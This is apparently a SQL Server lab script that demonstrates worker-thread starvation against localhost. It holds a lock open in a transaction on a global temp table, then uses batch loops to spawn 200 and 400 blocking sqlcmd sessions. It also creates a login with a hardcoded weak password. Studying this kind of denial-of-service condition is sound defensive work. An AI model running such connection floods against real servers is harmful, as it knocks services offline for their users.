USE BBM_ASPACE

SELECT max_workers_count FROM sys.dm_os_sys_info

USE [master]
GO

CREATE LOGIN [BBM_DDOS] WITH PASSWORD='Abcd1234.'
GO

--Conectarse con el login creado

IF OBJECT_ID('tempdb..##BBMDDOS') IS NOT NULL DROP TABLE ##BBMDOS;
CREATE TABLE ##BBMDOS (i INT) ;

BEGIN TRAN;
INSERT INTO ##BBMDOS (i) VALUES (1)
--(1 row affected)

SELECT * FROM ##BBMDOS


select COUNT(*), state from sys.dm_os_workers
GROUP BY state
ORDER BY COUNT(*) desc


FOR /l %%i IN (1,1,200) DO (
start /B sqlcmd -S localhost -U BBM_DDOS -P Abcd1234. -Q "select * from ##BBMDOS" >NUL 2>NUL
)


select COUNT(*), state from sys.dm_os_workers
GROUP BY state
ORDER BY COUNT(*) desc

FOR /l %%i IN (1,1,400) DO (
start /B sqlcmd -S localhost -U BBM_DDOS -P Abcd1234. -Q "select * from ##BBMDOS" >NUL 2>NUL
)

select COUNT(*), state from sys.dm_os_workers
GROUP BY state
ORDER BY COUNT(*) desc

SELECT * FROM sys.dm_tran_locks WHERE (request_status='WAIT' AND request_mode='S') OR (request_status='GRANT' AND request_mode='X')